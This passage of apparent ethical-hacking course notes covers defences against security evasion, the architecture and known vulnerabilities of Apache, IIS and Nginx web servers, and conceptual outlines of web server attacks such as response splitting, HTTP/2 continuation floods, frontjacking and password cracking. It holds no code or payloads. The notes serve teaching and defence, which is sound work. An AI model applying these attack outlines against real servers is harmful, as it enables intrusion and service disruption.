		- Regularly monitor and analyze firewall logs for suspicious activity.
		- Disable all FTP connections by default and review all inbound and outbound traffic.
		- Conduct regular risk assessments to identify vulnerable firewall rules.
		- Control and monitor user access, ensuring only authorized personnel can modify firewall configurations.
		- Define firewall rules specifying source/destination IPs and ports.
		- Document all firewall changes and notify security administrators.
		- Restrict physical access to the firewall and take regular backups of rulesets and configurations.
		- Perform scheduled firewall security audits.
		- Implement HTTPS/TLS inspection to prevent evasions.
		- Use HTTP Evader for automated firewall evasion testing.
		- Deploy deep packet inspection at the application layer.
		- Set connection limits per IP and restrict traffic based on geographical regions.
		- Create firewall rules based on user behavior, not just IP addresses.
		- Adopt a zero-trust security model, treating both internal and external traffic as untrusted.
	- Defend Against Endpoint Security Evasion:
		- Use advanced antivirus detection methods, including behavioral analysis, machine learning, and cloud-based threat intelligence.
		- Keep operating systems and applications updated.
		- Implement network segmentation and the principle of least privilege to prevent malware spread.
		- Define role-based access control, ensuring only authorized users have administrative privileges.
		- Enable multifactor authentication (MFA) for accessing critical systems and sensitive data.
		- Secure remote access with VPNs and other encrypted methods.
		- Deploy honeypots or decoys to deceive attackers.
		- Maintain detailed network activity logs and use SIEM solutions for analysis.
		- Enforce application whitelisting to allow only approved software on network devices.
		- Use code signing certificates to verify executable files and scripts.
		- Conduct regular security audits and penetration testing on endpoints.
		- Implement MAC address filtering to restrict network access to authorized devices.
		- Perform real-time network monitoring to detect unusual behavior.
		- Utilize memory protection techniques such as ASLR, DEP, and CFI.
		- Implement file integrity monitoring (FIM) to track changes in critical system files.
		- Enforce USB security measures to block malware from external devices.
		- Deploy data loss prevention (DLP) tools to control sensitive data movement.
		- Restrict the transfer of sensitive information via removable media and email.
	- Defend Against NAC Evasion:
		- Develop clear policies defining access controls, authentication requirements, and remediation steps for noncompliant devices.
		- Implement device profiling to identify and classify all network-connected devices, detecting unauthorized or suspicious behavior.
		- Enforce NAC policies dynamically, allowing real-time adjustments based on security threats.
		- Require multifactor authentication (MFA) and advanced methods like certificate-based or biometric authentication for secure access.
		- Use role-based access control (RBAC) to enforce least privilege principles and limit lateral movement by attackers.
		- Segment sensitive network resources using VLANs to contain potential breaches.
		- Conduct regular security audits and vulnerability assessments to identify weaknesses.
		- Use MAC address filtering to restrict access to authorized devices.
		- Adopt a zero-trust model, requiring continuous verification of all devices and users.
		- Deploy endpoint security solutions with antimalware, antiphishing, and firewall protection.
		- Share threat intelligence to enhance collective defense against NAC evasion.
		- Integrate NAC solutions with SIEM platforms for comprehensive security monitoring and event correlation.
		- Conduct proactive threat hunting to detect and mitigate NAC evasion attempts.
	- Defend Against Antivirus Evasion:
		- Use antivirus software with behavior-based detection, machine learning, and heuristic analysis to identify unknown threats.
		- Regularly update antivirus software, operating systems, applications, and firmware to patch vulnerabilities and incorporate the latest threat intelligence.
		- Ensure antivirus solutions provide real-time protection against malware.
		- Implement endpoint protection (EPP) with EDR capabilities for enhanced security beyond traditional antivirus.
		- Segment networks to restrict access to sensitive systems and prevent malware spread.
		- Educate users on the risks of downloading files, clicking suspicious links, and opening unknown attachments.
		- Use application whitelisting to allow only authorized programs, reducing the attack surface.
		- Monitor suspicious activities such as file modifications, process injections, and network anomalies.
		- Utilize sandbox environments to safely analyze potentially malicious files.
		- Implement SIEM solutions for centralized log collection and threat detection.
		- Deploy real-time script analysis tools to prevent malicious documents and attachments.
		- Combine multiple security layers, including firewalls, IDS, and IPS, for comprehensive defense.
		- Use signature-less detection methods like anomaly detection and AI to identify evasive malware.
		- Limit user privileges to the minimum necessary to prevent malware from gaining administrative access.
		- Secure remote access using VPNs and encrypted connections to reduce external attack risks.


--------------------------------------------------

# Hacking Web Servers


- Web Server:
	- A web server is a computer system that stores, processes, and delivers web pages to global clients via the Hypertext Transfer Protocol (HTTP). In general, a client initiates communication through an HTTP request. When a client requests a resource such as a web page, photo, or video, the browser generates an HTTP request and sends it to the web server. The web server then retrieves the requested content from data storage or application servers and responds to the client with an appropriate HTTP response. If the requested information cannot be found, the web server generates an error message.
	- Components of a Web Server:
		- Document Root:
			- The document root is the primary directory of the web server that stores essential HTML files related to a domain’s web pages. These files are sent in response to client requests.
			- For example, if the requested URL is www.certifiedhacker.com, and the document root is named "certroot" (stored in the directory /admin/web), then the document directory address is: /admin/web/certroot
			- If the complete request is www.certifiedhacker.com/P-folio/index.html, the server will search for the file at: /admin/web/certroot/P-folio/index.html
		- Server Root:
			- The server root is the top-level directory in the web server’s directory structure. It contains server configuration files, log files, and executable files necessary for server operation. Typically, it includes the following subdirectories:
				- conf: Stores the server's configuration files.
				- logs: Contains server log files, including access and error logs.
				- cgi-bin: Holds Common Gateway Interface (CGI) scripts or other server-side executables.
			- The server root may also include additional directories or files depending on the specific server software and its configuration.
		- Virtual Document Tree:
			- A virtual document tree allows storage on a different machine or disk when the original disk reaches capacity. It is case-sensitive and can also provide object-level security.
			- For example, in the case of www.certifiedhacker.com/P-folio/index.html, if the directory /admin/web/certroot is stored on a different disk, the server can still locate the requested file.
		- Virtual Hosting:
			- Virtual hosting is a technique that enables multiple domains or websites to be hosted on the same server. This allows efficient resource sharing and is commonly used by large-scale organizations that require global access and management.
			- The types of virtual hosting include: Name-based hosting, Internet Protocol (IP)-based hosting, Port-based hosting
		- Web Proxy:
			- A web proxy is a server positioned between a web client and a web server. Since all client requests are routed through the proxy before reaching the web server, proxies help prevent IP blocking and maintain user anonymity.
	- Vulnerabilities of Web Server Security:
		- A web server configured by an inexperienced or negligent system administrator may have critical security vulnerabilities. Lack of knowledge, negligence, and inattentiveness to security pose significant threats to web server security.
		- Failing to update the web server with the latest security patches.
		- Reusing administrator credentials across multiple systems.
		- Allowing unrestricted internal and outbound traffic.
		- Running unhardened applications and servers.
		- Providing detailed error messages that expose server version information.
		- Using outdated SSL/TLS encryption algorithms.
		- Installing unverified third-party plugins in web applications.
	- Impact of Web Server Attacks:
		- User Account Compromise: Attackers gain access to user accounts, extracting sensitive data and launching further attacks.
		- Website Defacement: Websites are altered with malicious messages, damaging credibility.
		- Secondary Attacks: Compromised servers are used to attack other systems or websites.
		- Root Access Exploitation: Attackers gain full control, allowing unrestricted modifications.
		- Data Tampering: Website data is altered, deleted, or replaced with malware.
		- Data Theft: Confidential information, including financial records and customer data, is stolen.
		- Reputation Damage: Breaches erode customer trust and tarnish the company’s image.
	- Compromise Web Server Security:
		- Improper file, directory, and authentication permissions, allowing unauthorized access.
		- Installing the server with default settings, including default accounts and weak or no passwords.
		- Enabling unnecessary services like content management, remote administration, or debugging functions.
		- Prioritizing ease of use over security best practices.
		- Lack of security policies, procedures, regular maintenance, and proper configurations.
		- Keeping unnecessary default, backup, or sample files that could be exploited.
		- Bugs and misconfigurations in the web server, OS, network, or web applications.
		- Weak encryption settings, misconfigured or self-signed SSL certificates.
		- Hosting web services on shared or multi-use servers instead of dedicated ones.
		- Granting excessive privileges to users or processes instead of enforcing least privilege.
	- Apache Web Server Architecture (httpd.apache.org):
		- The Apache web server is an open-source HTTP server used to deliver web content over the Internet. Apache can host websites, handle HTTP requests, and serve both static and dynamic content.
		- Components Of Apache Web Server Architecture:
			- HTTP Client: A browser or software that initiates requests to the Apache server, requesting web pages, files, or other resources.
			- HTTP Server (Core): The core module handles HTTP(S) requests and responses, interfacing with various modules to provide additional functionalities, including:
				- mod_auth: Manages user authentication, ensuring that only authorized users can access specific web resources based on configured credentials.
				- mod_ssl: Provides SSL/TLS encryption to secure communication between the server and clients.
				- mod_rewrite: Enables URL rewriting, customized URLs, and redirection based on specified rules.
				- mod_proxy: Functions as a proxy and gateway, enabling request forwarding to other servers and load balancing.
			- BMMTM Extensible Agent: Intercepts HTTP(S) requests and responses to gather detailed transaction data. It enhances monitoring and performance analysis by providing insights into interactions between clients and servers.
			- Application Server: Executes backend applications, processes data, and generates dynamic content. It functions separately from the web server that handles HTTP requests. The application server runs applications written in various programming languages (e.g., PHP, Java, Python), generating dynamic content that is subsequently served by the Apache web server.
		- Apache Vulnerabilities:
			- HTTP Response Splitting:
				- This vulnerability occurs when improperly validated input allows attackers to inject malicious headers into HTTP responses.
				- Attackers can exploit this to manipulate web traffic, potentially leading to cross-site scripting (XSS), cache poisoning, or sensitive information disclosure.
			- HTTP/2 DoS via Memory Exhaustion on Endless Continuation Frames:
				- This vulnerability occurs when attackers send continuous HTTP/2 headers, leading to excessive memory consumption and a potential denial of service (DoS).
				- Attackers exploit this by exhausting the server’s memory, causing it to become unresponsive or crash.
			- mod_macro Buffer Over-Read:
				- This vulnerability occurs when the mod_macro module improperly handles macro expansion, causing it to read beyond the buffer’s end.
				- Attackers exploit this by sending specially crafted requests that trigger the over-read, potentially exposing sensitive data stored in adjacent memory locations.
			- DoS in HTTP/2 with Initial Window Size 0:
				- This vulnerability arises when an attacker sets the HTTP/2 initial window size to 0, preventing the server from sending data.
				- Attackers exploit this by sending requests that set the window size to 0, causing the server to wait indefinitely for updates, leading to a denial of service (DoS).
			- HTTP/2 Stream Memory Not Reclaimed Immediately on RST:
				- This vulnerability occurs when memory allocated for an HTTP/2 stream is not immediately freed upon receiving a stream reset (RST) frame.
				- Attackers exploit this by repeatedly creating and resetting streams, consuming memory without releasing it, which eventually leads to memory exhaustion and a denial of service (DoS).
			- Insecure Default Configuration:
				- This vulnerability arises from insecure default administrative credentials, which can lead to remote code execution (RCE).
				- Attackers exploit this by using default credentials to gain administrative access and execute arbitrary code.
			- Improper Authorization:
				- This vulnerability arises from flaws in the server’s authorization mechanisms.
				- Attackers can exploit these flaws to bypass authorization checks, gaining unauthorized access or escalating privileges to perform restricted actions.
			- DNS Rebinding in Import Functionality:
				- This vulnerability occurs due to inadequate input validation in the import functionality of Apache Allura.
				- Attackers can manipulate DNS responses to access internal services, potentially exposing sensitive information.
			- Environment Variable Injection:
				- This vulnerability arises from improper handling of environment variables, allowing attackers to override configurations such as ZEPPELIN_INTP_CLASSPATH_OVERRIDES in Apache Zeppelin.
				- Attackers exploit this by injecting malicious code or commands into these variables, leading to arbitrary code execution on the server.
			- Code Injection:
				- This vulnerability occurs when connecting to a MySQL database via the JDBC driver in Apache Zeppelin.
				- Attackers can inject sensitive configurations or malicious code during the database connection setup, leading to remote code execution.
			- Improper Certificate Validation:
				- This vulnerability arises from improper certificate validation in FTP_TLS connections of Apache Airflow.
				- Attackers can exploit this by intercepting or manipulating FTP traffic, potentially leading to man-in-the-middle (MITM) attacks.
			- Cross-Site Scripting (XSS):
				- This vulnerability arises due to improper input handling, allowing attackers to perform XSS attacks by injecting malicious scripts into log entries.
				- In Apache Airflow, this enables attackers to insert harmful data into task instance logs.
			- Path Traversal Vulnerability:
				- This vulnerability occurs due to improper restriction of file paths, allowing attackers to access files and directories outside the intended scope in Apache OFBiz.
				- Attackers can exploit this to execute arbitrary code or access sensitive information by navigating to unintended directories.
			- SQL Injection:
				- This vulnerability is caused by improper neutralization of special elements in SQL commands in the Apache Submarine Server Core.
				- Attackers can exploit this to execute arbitrary SQL queries, leading to unauthorized access, data retrieval, or database modifications.
	- IIS Web Server Architecture:
		- Internet Information Services (IIS) is a web server application developed by Microsoft that runs on a server and responds to browser requests. It supports multiple protocols, including HTTP, HTTPS (HTTP Secure), FTP (File Transfer Protocol), FTPS (FTP Secure), SMTP (Simple Mail Transfer Protocol), and NNTP (Network News Transfer Protocol).
		- IIS applications use HTML to present the user interface and compiled Visual Basic code to process requests and respond to browser events. IIS for Windows is a flexible and easy-to-manage web server designed for web hosting.
		- IIS Components (core):
			- Protocol Listeners (HTTP.sys) – Handles incoming HTTP requests.
			- World Wide Web Publishing Service (WWW Service) – Manages websites and applications.
			- Windows Process Activation Service (WAS) – Controls application pools and worker processes.
		- IIS and DLL Dependencies:
			- IIS relies on a set of dynamic link libraries (DLLs) that work in conjunction with the main server process (inetinfo.exe). These DLLs provide various functionalities, such as content indexing, server-side scripting, and web-based printing.
		- Functioning of IIS Server Components:
			- When a client browser sends an HTTP request, HTTP.sys intercepts it and retrieves configuration data from ApplicationHost.config via WAS. WAS forwards site and application pool settings to the WWW Service, which configures HTTP.sys. WAS then starts a worker process for the target application pool, which processes the request and returns the response to HTTP.sys, which delivers it to the client browser.
		- IIS Vulnerabilities:
			- Trust Boundary Violation Vulnerability:
				- This vulnerability arises from inadequate separation of privilege boundaries, allowing an unauthenticated entity to access restricted functionality in the Telerik Report Server.
				- Exploiting this flaw may enable unauthorized manipulation of server operations.
			- Authentication Bypass Vulnerability:
				- This occurs due to flaws in the authentication process, where an insecure endpoint permits unauthenticated access to restricted server functionality.
				- Attackers can exploit this vulnerability to bypass authentication and execute arbitrary code on the server.
			- CRLF Cross-Site Scripting (XSS) Vulnerability:
				- This vulnerability results from misconfigurations in the SiteMinder Web Agent for IIS Web Server.
				- Attackers can execute arbitrary JavaScript code in a client’s browser by exploiting this flaw.
			- C•CURE Passwords Exposed to Administrators:
				- This vulnerability arises due to improper handling and logging of sensitive information within Microsoft IIS when hosting the C•CURE 9000 Web Server.
				- Attackers can exploit this flaw to retrieve sensitive Windows credentials from logs.
			- Arbitrary File Path Access Vulnerability:
				- This vulnerability is caused by the default configuration of the Aquaforest TIFF Server, which fails to properly restrict access to file paths.
				- Attackers can exploit this flaw to enumerate, traverse, or access restricted files and directories, potentially bypassing authentication.
			- Windows IIS Server Elevation of Privilege Vulnerability:
				- This vulnerability occurs due to improper handling of specific user requests in Windows IIS Server.
				- Attackers can exploit this flaw to gain unauthorized access and potentially take control of the system.
			- File and Directory Permissions Vulnerability:
				- This vulnerability results from incorrect default permissions in the Hitachi JP1/Performance Management software on Windows.
				- Attackers can manipulate files and directories without authorization by exploiting this flaw.
			- TYPO3 Cross-Site Scripting (XSS) Vulnerability:
				- This vulnerability is caused by unfiltered use of the server environment variable `PATH_INFO` in the `GeneralUtility::getIndpEnv()` component of the TYPO3 Content Management Framework.
				- Attackers can exploit this flaw by injecting malicious HTML code into uncached pages, potentially impacting other visitors.
			- MailEnable Vulnerability:
				- This vulnerability arises from improper handling of file paths under certain conditions.
				- It allows authenticated mail users to add files with unsanitized content to public folders where the IIS user has access, potentially leading to arbitrary code execution.
			- XSS in Password Manager:
				- This vulnerability is due to improper neutralization of user-controllable input within the `/isapi/PasswordManager.dll` `ResultURL` parameter.
				- Attackers can exploit this flaw to inject malicious scripts and steal sensitive information.
	- Nginx Web Server Architecture:
		- Nginx is a high-performance, scalable web server, reverse proxy, and load balancer that operates on a master-worker architecture. It employs a single-threaded, event-driven, asynchronous, and non-blocking model to efficiently manage multiple connections.
		- At its core, Nginx consists of a master process that oversees multiple worker processes, each responsible for handling client requests. This modular architecture allows extensive customization through various HTTP, stream, mail, and third-party modules. Nginx supports advanced load balancing, robust caching, SSL/TLS termination, and detailed logging. Its security features—including access control, authentication, and rate limiting—make it suitable for high-traffic and mission-critical applications.
		- Key Components of Nginx Architecture:
			- Master Process: The master process is responsible for reading and validating configuration files, creating, binding, and closing sockets, and managing worker processes. It performs administrative tasks and ensures that worker processes are properly configured and running efficiently.
			- Worker Processes: Worker processes handle client requests by accepting connections, reading and writing data, and communicating with upstream servers. Each single-threaded worker uses non-blocking I/O to handle thousands of simultaneous connections. Once a request is processed, the worker sends the response back to the client. Shared memory zones enable communication and data sharing between worker processes.
			- Proxy Cache: The proxy cache stores copies of requested content to reduce backend server load and speed up response times by serving frequently accessed content directly from memory. This enhances performance and reduces latency.
				- Cache Loader: Loads cache metadata into memory at startup, ensuring that cached content is immediately available for requests. It scans cache directories and initializes in-memory cache structures.
				- Cache Manager: Periodically checks for expired content, removes outdated or unused cache entries, and ensures the cache does not exceed its configured limits.
			- Web Server: The web server component of Nginx handles HTTP requests from clients, serves static content, and forwards dynamic content requests to application servers.
			- Application Server: The application server processes client requests by executing server-side scripts or applications and delivering dynamic content.
			- Memcached: Memcached acts as a caching layer that stores frequently accessed data in memory, reducing database query loads and enhancing response times.
		- Nginx Vulnerabilities:
			- NULL Pointer Dereference in HTTP/3:
				- This vulnerability arises due to a NULL pointer dereference in Nginx's QUIC module when handling HTTP/3 requests, causing worker processes to terminate.
				- Attackers can exploit this flaw by sending specially crafted requests to a vulnerable Nginx server, leading to a denial of service (DoS) or potential remote code execution (RCE).
			- Server-Side Request Forgery (SSRF) Vulnerability:
				- This vulnerability occurs due to SSRF in the upload link feature of mintplex-labs/anything-llm.
				- Attackers can exploit it by hosting a malicious website, enabling them to perform internal port scanning, access non-public web applications, delete arbitrary files, and carry out local file inclusion (LFI).
			- Remote Code Execution (RCE) Vulnerability:
				- This vulnerability results from exposed configuration settings in Nginx-UI.
				- Attackers can leverage it to execute remote code, escalate privileges, or disclose sensitive information.
			- Improper Certificate Validation:
				- This issue arises due to improper validation of user input in the Import Certificate feature of Nginx-UI.
				- Attackers can exploit this vulnerability to write arbitrary files, potentially compromising the system.
			- SQL Injection Vulnerability:
				- This vulnerability stems from improper neutralization of special SQL characters, allowing unsanitized user input to be appended to queries.
				- Attackers can exploit it to execute arbitrary SQL queries, leading to unauthorized access or data breaches.
			- Unauthenticated Private Key Access:
				- This vulnerability occurs due to reliance on .htaccess for security, which is ineffective on Nginx servers that do not support .htaccess files.
				- Attackers can exploit this flaw to read private keys on affected servers.
			- Excessive Memory Usage and CPU Exhaustion in HTTP/2:
				- This vulnerability results from improper memory handling and excessive CPU consumption when processing HTTP/2 requests.
				- Attackers can flood the server with HTTP/2 requests, depleting system resources and disrupting normal operations.
			- OS Command Injection in nginxWebUI:
				- This vulnerability arises due to improper handling of file arguments in the upload feature.
				- Attackers can manipulate file arguments to inject and execute OS commands remotely on the server.
			- Default File Permissions Vulnerability:
				- This vulnerability exists because the Nginx Management Suite assigns default file permissions that allow authenticated users to modify sensitive files.
				- Attackers can leverage this flaw to alter critical files in the Nginx Instance Manager and Nginx API Connectivity Manager.
- Web Server Attacks:
	- DNS Server Hijacking:
		- The Domain Name System (DNS) resolves domain names to their corresponding IP addresses. When a user queries a DNS server with a domain name, the server responds with the appropriate IP address.
		- In DNS server hijacking, an attacker compromises a DNS server and alters its mapping settings to redirect queries to a rogue DNS server. This rogue server then directs users to malicious websites controlled by the attacker. As a result, when a user enters a legitimate URL in a browser, they are unknowingly redirected to a fraudulent site.
	- DNS Amplification:
		- A recursive DNS query is a method of requesting DNS resolution, where the query passes through multiple DNS servers until the correct domain name-to-IP address mapping is found or the request fails.
		- Attackers exploit recursive DNS queries to conduct a DNS amplification attack, which generates a large volume of traffic to overwhelm a target's DNS server, leading to a Distributed Denial-of-Service (DDoS) attack.
	- Directory Traversal Attacks:
		- A directory traversal attack occurs when an attacker exploits a vulnerability in a web application's code or a misconfigured or poorly patched web server. These weaknesses can allow unauthorized access to restricted directories and sensitive files.
		- Web servers are designed to limit public access to certain directories. However, directory traversal attacks exploit HTTP vulnerabilities, enabling attackers to bypass these restrictions and execute commands outside the web server’s root directory by manipulating Uniform Resource Locators (URLs). Attackers commonly use the dot-dot-slash (../) sequence to navigate beyond the root directory and access sensitive system files. They may employ a trial-and-error approach to locate and retrieve confidential information.
		- This attack is typically carried out using a web browser or automated tools. A web server is vulnerable if it accepts user input without proper validation, allowing attackers to manipulate directory paths and gain unauthorized access.
	- Website Defacement:
		- Website defacement refers to unauthorized modifications to the content of a single web page or an entire website, altering its visual appearance. Hackers gain access to web servers and modify the hosted website by injecting code to add images, pop-ups, or text, thereby changing the site's appearance. In some cases, attackers may replace the entire website rather than just modifying a single page.
		- Defaced pages often expose visitors to propaganda, misleading information, or offensive content until the unauthorized changes are detected and fixed. Attackers use various techniques, such as SQL injection, to gain access and deface websites. Beyond altering the site's appearance, attackers may also inject malicious code to compromise visitors' devices, making them vulnerable to malware or virus infections.
		- Thus, website defacement not only damages the target organization's reputation but can also pose security risks to its visitors.
	- Web Server Misconfiguration:
		- Web server misconfiguration refers to weaknesses in web infrastructure settings that can be exploited to launch various attacks, such as directory traversal, server intrusion, and data theft.
		- Common Web Server Misconfigurations:
			- Verbose debug/error messages
			- Default or anonymous user accounts with weak credentials
			- Sample configuration and script files left accessible
			- Unrestricted remote administration functions
			- Unnecessary services enabled
			- Misconfigured or default SSL certificates
		- Examples of Web Server Misconfigurations:
			- Exposed Server Status Page: A misconfiguration may allow unrestricted access to the server status page, revealing detailed information about server usage, active hosts, and ongoing requests.
			- Verbose Error Messages: The server may display detailed error messages that reveal sensitive information, such as file paths, database queries, or system configurations, which attackers can exploit.
			- Directory Browsing Enabled (IIS Web Server): A misconfigured web.config file may enable directory browsing, allowing users to see the contents of directories, potentially exposing sensitive files.
			- Unrestricted File Uploads (IIS Web Server): The server may allow users to upload files without proper validation or security checks, enabling attackers to upload and execute malicious files (e.g., web shells), leading to remote code execution.
			- Misconfigured Root Location (Nginx Web Server): If the root location (location / {}) is missing in the Nginx configuration, it can cause undefined behaviors, potentially exposing directory listings or default server configurations.
			- Lack of Input Sanitization: Directly using user input in variables without sanitization can lead to injection attacks. All user inputs should be validated and sanitized to prevent malicious payloads from executing.
		- Properly configuring a web server is crucial to minimizing security risks and preventing unauthorized access, data breaches, and service disruptions.
	- HTTP Response-Splitting Attack:
		- An HTTP response-splitting attack is a web-based attack in which an attacker manipulates server responses by injecting new line characters into response headers along with arbitrary code. This attack exploits input validation vulnerabilities, allowing the attacker to split a server’s response into two separate responses. Common attacks facilitated by HTTP response splitting include Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and SQL Injection.
		- An attacker can exploit a vulnerable Apache HTTP server by leveraging improper input validation. By crafting a specially constructed request header, the attacker tricks the server into generating two separate HTTP responses. This manipulation enables the attacker to inject malicious content into an HTTP response header, causing the first response to redirect the user to a malicious website while the browser discards any subsequent responses.
		- Example of HTTP Response-Splitting Attack: An attacker injects a response-splitting payload into a request, causing the server to generate two responses—one for the attacker and another for an unsuspecting victim. As the victim submits credentials, the attacker requests the index page. The server then mistakenly sends the victim’s response to the attacker, granting unauthorized access to sensitive data while the victim remains unaware.
		- Proper input validation and sanitization of user-supplied data are critical in preventing HTTP response-splitting attacks.
	- Web Cache Poisoning Attack:
		- Web cache poisoning compromises the reliability of an intermediate web cache. In this attack, an attacker replaces cached content for a specific URL with malicious content. As a result, users unknowingly receive the poisoned content instead of the legitimate, secure content when accessing the cached resource.
		- The attacker manipulates the web cache by forcing the server to flush its legitimate cache and accept a specially crafted malicious request. Once stored, all users relying on that cache will receive the harmful content until the cache is cleared. Web cache poisoning attacks are possible when the web server or application has vulnerabilities such as HTTP response splitting.
	- SSH Brute Force Attack:
		- Attackers exploit the SSH protocol to establish an encrypted SSH tunnel between two hosts, allowing them to transfer unencrypted data over an insecure network. By default, SSH operates on TCP port 22. To launch an attack, an attacker scans SSH servers using automated bots, performing a port scan on TCP port 22 to identify potential vulnerabilities.
		- Using a brute-force attack, the attacker attempts to guess login credentials to gain unauthorized access to the SSH server. Once access is obtained, the attacker can leverage the SSH tunnel to transmit malware and carry out further exploitation without detection. Common tools used for SSH brute-force attacks on Linux platforms include Nmap and Ncrack.
	- FTP Brute Force with AI:
		- Attackers can leverage AI-powered technologies to enhance and automate brute-force attempts, making them more efficient and difficult to detect. AI can optimize attack strategies by predicting password patterns and adjusting attempts based on previous failures.
		- For example, an attacker use AI-driven tools to generate targeted password lists or automate attack sequences.
	- HTTP/2 Continuation Flood Attack:
		- The HTTP/2 Continuation Flood Attack exploits the way HTTP/2 handles CONTINUATION frames, leading to resource exhaustion on the target Apache server. In HTTP/2, headers that are too large to fit in a single HEADERS frame can be split into multiple frames. The initial portion of the headers is sent in a HEADERS frame, while the remaining parts follow in CONTINUATION frames.
		- Attackers exploit this mechanism by continuously sending CONTINUATION frames within a single TCP connection without completing the header sequence. This forces the Apache server to allocate excessive resources, eventually leading to a denial-of-service (DoS) condition.
		- How the HTTP/2 Continuation Flood Attack Works:
			- Establishing a Connection: The attacker initiates a TCP connection with the target Apache server.
			- Sending an Incomplete Header Sequence: The attacker sends a legitimate HEADERS frame containing initial headers for a request. More headers are expected in subsequent CONTINUATION frames.
			- Resource Allocation on the Server: Upon receiving the HEADERS frame, the Apache server allocates memory and processing resources to handle the incoming request.
			- Exploiting CONTINUATION Frames: Instead of completing the header sequence by setting the END_HEADERS flag, the attacker sends numerous CONTINUATION frames, each indicating that additional header data is forthcoming.
			- Server Resource Drain: For each CONTINUATION frame received, the server continues allocating memory and CPU resources, remaining in a state of anticipation for the completion of the header sequence.
			- Server Overload and DoS Condition: As the number of CONTINUATION frames increases, the server's resources become exhausted. This leads to performance degradation, system crashes, or complete unresponsiveness.
	- Frontjacking Attack:
		- Frontjacking is a web server attack in which an attacker injects or manipulates front-end components of a web application—such as scripts or HTML elements—to hijack the user interface or user interactions. This attack often targets poorly configured Nginx reverse proxy servers in shared hosting environments by exploiting vulnerabilities such as CRLF injection, HTTP request header injection, and XSS (Cross-Site Scripting).
		- Attackers take advantage of misconfigurations in the reverse proxy, such as improper sanitization of $uri and $document_uri variables, to inject a malicious Host header. This manipulation alters the execution flow of the front-end reverse proxy, replacing the intended backend server with an attacker-controlled server.
		- As a result, attackers can: Display malicious content, Redirect users to phishing websites, Execute reflected XSS and other injection payloads, Inject harmful scripts to compromise users.
		- How Frontjacking Attack Works:
			- Injection of a Malicious Host Header: The attacker crafts an HTTP request containing CRLF characters in the URI to inject a malicious Host header and sends it to the vulnerable reverse proxy server.
			- Processing by the Vulnerable Reverse Proxy: The reverse proxy fails to properly sanitize the injected Host header and processes the malicious request.
			- Redirection to an Attacker-Controlled Server: Instead of routing the request to the legitimate backend server, the proxy redirects traffic to the attacker's server.
			- Delivery of Malicious Content: The attacker-controlled server responds with phishing pages, malware, or injected scripts, compromising users who access the affected web application.
	- Other Web Server Attacks:
		- Web Server Password Cracking:
			- Password cracking is one of the most common methods used to gain unauthorized access to a web server by exploiting weak or flawed authentication mechanisms. Attackers employ different methods to facilitate password cracking, including social engineering, spoofing, phishing, Trojan horses, viruses, wiretapping, and keystroke logging.
			- Weak or commonly used passwords are often targeted. Some of the most frequently compromised passwords include "password," "root," "administrator," "admin," "demo," "test," "guest," "qwerty," and personal identifiers like pet names.
			- Common Targets of Web Server Password Cracking: SMTP and FTP servers, Web shares, SSH tunnels, Web form authentication.
			- Web Server Password Cracking Techniques:
				- Guessing: This is one of the most common methods of password cracking. The attacker manually guesses possible passwords or uses automated tools with dictionary files. Many people use easily memorable but weak passwords, such as pet names, loved ones' names, license plate numbers, birth dates, or common words like "QWERTY," "password," "admin," etc.
				- Dictionary Attack: A dictionary attack relies on a predefined list of words and systematically tests them as potential passwords. An automated program enters each word from the list to check if it matches the password. While effective against simple passwords, this method is less successful if the password includes special characters, numbers, or symbols. Compared to a brute-force attack, a dictionary attack is faster and less resource-intensive.
				- Brute-Force Attack: In this method, all possible character combinations are systematically tested, including uppercase letters (A–Z), lowercase letters (a–z), numbers (0–9), and special characters. While effective for short passwords, brute-force attacks can take months or even years to crack complex passwords with multiple character types.
				- Hybrid Attack: A hybrid attack combines dictionary and brute-force techniques, making it more powerful than either method alone. It not only tests dictionary words but also appends numbers and symbols to increase the chances of success. This approach improves efficiency in cracking passwords, especially those that include minor modifications of common words (e.g., "password123" or "admin!").
		- DoS/DDoS Attacks:
			- A Denial-of-Service (DoS) or Distributed Denial-of-Service (DDoS) attack floods a target with an overwhelming number of fake requests, causing it to crash or become inaccessible to legitimate users. Attackers use these attacks to disrupt web servers, rendering them unavailable.
			- Web server DoS/DDoS attacks often target high-profile systems, including bank servers, credit card payment gateways, and root name servers. By overwhelming the server with traffic, attackers deplete its resources, causing downtime or severe performance degradation.
			- To crash a web server or disrupt its application, attackers exploit the following system resources:
				- Network bandwidth: Overloading the network with excessive traffic
				- Server memory: Consuming RAM to slow down or crash processes
				- Application exception handling mechanisms: Exploiting errors to cause failures
				- CPU usage: Overloading the processor with excessive computations
				- Hard disk space: Filling up storage with unnecessary data
				- Database space: Overloading databases to slow or crash operations
			- Mitigation strategies include implementing firewalls, rate limiting, load balancing, and DDoS protection services to prevent or minimize the impact of such attacks.
		- Man-in-the-Middle (MITM) Attack:
			- A Man-in-the-Middle (MITM) attack, also known as a Manipulator-in-the-Middle attack, allows an attacker to intercept and alter communications between an end user and a web server. By eavesdropping on or intruding into the connection, the attacker can steal sensitive information, such as online banking details, usernames, and passwords, that are transmitted over the internet.
			- In an MITM or sniffing attack, the attacker intercepts or modifies messages exchanged between the user and the web server. One common method involves tricking the victim into connecting to a malicious proxy that the attacker controls. If the victim accepts the connection, all communication between the user and the web server passes through the attacker, allowing them to steal sensitive data.
			- To prevent MITM attacks, users and organizations should implement encryption (TLS/SSL), strong authentication mechanisms, VPNs, and secure network configurations to protect communications.
		- Phishing Attacks:
			- A phishing attack occurs when an attacker deceives a user into submitting login credentials on a fake website that appears legitimate but is actually controlled by the attacker. The user is then unknowingly redirected to a malicious site hosted on the attacker's web server.
			- Attackers commonly execute phishing attacks by sending emails containing malicious links that trick users into clicking them. These links lead to fraudulent websites designed to mimic trusted platforms, such as banking portals, social media sites, or corporate login pages. Once the victim enters sensitive information—such as usernames, passwords, bank account details, or Social Security numbers—the attacker captures and stores the data.
			- Using the stolen credentials, the attacker may later gain unauthorized access to the legitimate website, impersonating the victim to perform malicious actions, such as stealing funds, accessing confidential data, or spreading further attacks.
			- Mitigation strategies include email filtering, multi-factor authentication (MFA), SSL/TLS encryption, and user awareness training to help prevent phishing attacks.
		- Web Application Attacks:
			- Vulnerabilities in web applications running on a web server create significant attack vectors that can compromise the security of the server. Even if a web server is securely configured and protected by network security measures such as firewalls, a poorly coded web application can serve as an entry point for attackers. If developers fail to implement secure coding practices, attackers may exploit vulnerabilities to compromise both the web application and the underlying server.
			- To mitigate these attacks, developers should implement secure coding practices, input validation, encryption, access controls, and web application firewalls (WAFs). Regular security audits and vulnerability assessments can further help protect web applications and web servers from exploitation.
